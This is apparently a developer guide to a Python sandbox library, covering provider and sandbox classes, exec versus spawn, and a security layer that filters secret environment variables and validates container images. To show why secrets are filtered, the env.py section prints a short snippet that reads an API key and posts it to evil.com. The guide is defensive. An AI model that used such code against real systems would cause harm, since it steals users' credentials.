# Sandbox Core Concepts

This document explains the core abstractions in `base.py`.

---

## Sandbox vs SandboxProvider

Think of it like a **car rental**:

| Concept | Analogy | What it does |
|---------|---------|--------------|
| **SandboxProvider** | Car rental company | Creates/manages sandboxes. One per backend type. |
| **Sandbox** | A rented car | The actual isolated environment you use. |

```python
# SandboxProvider = Factory (creates sandboxes)
provider = LocalProcessProvider()

# Sandbox = Instance (the thing you actually use)
sandbox = await provider.create()
await sandbox.exec(["python", "-c", "print('hello')"])
await sandbox.destroy()
```

**One provider → many sandboxes** (just like one rental company → many cars)

---

## ByteReader / ByteWriter (Binary I/O)

These are for **talking to a running process** via stdin/stdout/stderr.

**Why binary, not text?**
```
Text mode problem:
  - JSONL uses \n (newline) as delimiter
  - Unicode has U+2028 (line separator) which LOOKS like a newline
  - Text mode can corrupt your data

Binary mode:
  - Raw bytes, no interpretation
  - You control encoding/decoding
  - Safe for JSONL, binary files, etc.
```

```python
# ByteWriter = Send bytes TO the process (stdin)
process.stdin.write(b'{"command": "run"}\n')
await process.stdin.drain()  # Flush the buffer

# ByteReader = Read bytes FROM the process (stdout/stderr)
data = await process.stdout.read(1024)  # Read up to 1024 bytes
```

---

## exec() vs spawn() - Short Command vs Long Process

| Method | Use Case | Behavior |
|--------|----------|----------|
| `exec()` | Quick commands | Runs, waits, returns result |
| `spawn()` | Long-running processes | Starts process, you manage it |

### exec() - "Run and wait"
```python
# Like running a shell command and getting output
result = await sandbox.exec(["ls", "-la"])
print(result.stdout_text)  # Directory listing
print(result.exit_code)    # 0 = success
```
- Blocks until command finishes
- Captures all stdout/stderr
- Returns `ExecResult` with everything

### spawn() - "Start and interact"
```python
# Like starting a Python REPL you'll talk to
process = await sandbox.spawn(["python", "-i"])

# Send commands
process.stdin.write(b"print(2+2)\n")
await process.stdin.drain()

# Read response
output = await process.stdout.read(100)  # b"4\n"

# Later, stop it
await process.terminate()
```
- Returns immediately with `ProcessHandle`
- You send/receive data over time
- Used for: REPLs, servers, agents, long tasks

---

## Architecture Diagram

```
┌─────────────────────────────────────────────────────────┐
│                   SandboxProvider                        │
│                   (Factory - one per backend)            │
│                                                          │
│   create() ──────────────────────────────────────────┐   │
│   resume() ──► Returns Sandbox instances             │   │
│   get()    ──────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────┐
│                      Sandbox                             │
│                   (The isolated environment)             │
│                                                          │
│   exec()  ────► Run command, wait, get result            │
│   spawn() ────► Start process, get handle for I/O        │
│                                                          │
│   read_file() / write_file() ────► File operations       │
│   destroy() ────► Clean up when done                     │
└─────────────────────────────────────────────────────────┘
                           │
                           ▼ (spawn returns)
┌─────────────────────────────────────────────────────────┐
│                   ProcessHandle                          │
│                (Long-running process)                    │
│                                                          │
│   stdin  (ByteWriter) ────► Send bytes to process        │
│   stdout (ByteReader) ────► Read bytes from process      │
│   stderr (ByteReader) ────► Read error output            │
│                                                          │
│   terminate() / kill() ────► Stop the process            │
└─────────────────────────────────────────────────────────┘
```

---

## Quick Reference

| Class | Purpose | Lifecycle |
|-------|---------|-----------|
| `SandboxProvider` | Factory for sandboxes | Lives for app lifetime |
| `Sandbox` | Isolated execution environment | Created → Used → Destroyed |
| `ProcessHandle` | Running process inside sandbox | Spawned → Interacted → Terminated |
| `ExecResult` | Output from `exec()` | Returned once, read-only |

---

## Simple Rule

- Use `exec()` for one-off commands
- Use `spawn()` when you need ongoing interaction

---

# Security Layer

The `security/` folder contains two guards that protect sandboxes.

---

## env.py - Environment Sanitization

Think of it like a **bouncer at a nightclub** checking IDs:

```
Your Host Machine                         Sandbox
┌─────────────────┐                    ┌─────────────────┐
│ OPENAI_API_KEY  │ ──── BLOCKED ────X │                 │
│ AWS_SECRET_KEY  │ ──── BLOCKED ────X │                 │
│ DATABASE_URL    │ ──── BLOCKED ────X │                 │
│                 │                    │                 │
│ PATH            │ ──── ALLOWED ────► │ PATH            │
│ HOME            │ ──── ALLOWED ────► │ HOME            │
│ LANG            │ ──── ALLOWED ────► │ LANG            │
│                 │                    │                 │
│ vk_session_123  │ ── SPECIAL OK ───► │ vk_session_123  │
└─────────────────┘                    └─────────────────┘
```

### Three Rules

| Rule | What it does | Example |
|------|--------------|---------|
| **DENY** | Block dangerous secrets | `OPENAI_API_KEY`, `AWS_SECRET_*`, `*PASSWORD*` |
| **ALLOW** | Let safe vars through | `PATH`, `HOME`, `LANG`, `TERM` |
| **INJECT** | Allow special virtual keys | `vk_*` (sandbox-scoped, not real API keys) |

### Why?

If your sandbox runs untrusted code and it can read `OPENAI_API_KEY`:
```python
# Malicious code in sandbox could do:
import os
api_key = os.environ["OPENAI_API_KEY"]  # Steal your key!
requests.post("https://evil.com", data={"key": api_key})
```

With `env.py`, that variable **never enters the sandbox**.

---

## guards.py - Security Guards

Think of it like **TSA security at an airport** - two checkpoints:

### Guard 1: Multi-Tenant Provider Check

```
                     MULTI_TENANT_STRICT = true
                              │
                              ▼
┌─────────────────────────────────────────────────────────┐
│                    Who's allowed?                        │
│                                                          │
│   ✅ e2b          → Cloud VMs, fully isolated            │
│   ✅ none         → No sandbox needed                    │
│   ✅ firecracker  → VM-based isolation                   │
│                                                          │
│   ❌ local_docker → Shares host Docker daemon            │
│   ❌ local_process→ Runs on your machine directly        │
└─────────────────────────────────────────────────────────┘
```

**Why?** In production with multiple customers (tenants), you can't use local Docker - Customer A might see Customer B's data.

### Guard 2: Image Digest Validation

Prevents using **placeholder or fake** container images:

```
Image Digest                              Verdict
─────────────────────────────────────────────────────
sha256:a3f8...real...digest...           ✅ VALID

sha256:PLACEHOLDER                        ❌ BLOCKED (placeholder)

sha256:REPLACE_ME_LATER                   ❌ BLOCKED (placeholder)

sha256:aaaaaaaaaaaaa...aaaaaaa            ❌ BLOCKED (test fixture)

sha256:00000000000...0000000              ❌ BLOCKED (test fixture)

(empty)                                   ❌ BLOCKED (missing)
```

**Why?** Developers often put `sha256:PLACEHOLDER` in config files. This guard ensures you can't accidentally deploy with fake images.

---

## When Are Security Guards Called?

```
router.create("scope-123")
         │
         ▼
┌─────────────────────────────────────┐
│ Guard 1: Multi-tenant check         │  ← guards.py
│ "Is this provider allowed?"          │
└─────────────────────────────────────┘
         │
         ▼
┌─────────────────────────────────────┐
│ Guard 2: Image digest check         │  ← guards.py
│ "Is this a real image?"              │
└─────────────────────────────────────┘
         │
         ▼
┌─────────────────────────────────────┐
│ Sanitize environment                │  ← env.py
│ "Filter out secrets"                 │
└─────────────────────────────────────┘
         │
         ▼
    provider.create()  ← Actually create sandbox
```

---

## Security Summary

| File | Job | Analogy |
|------|-----|---------|
| `env.py` | Filter environment variables | Bouncer checking IDs |
| `guards.py` | Validate provider + image | TSA security checkpoint |

Both are **defense-in-depth** - multiple layers of protection so one mistake doesn't expose secrets or allow unsafe configs.
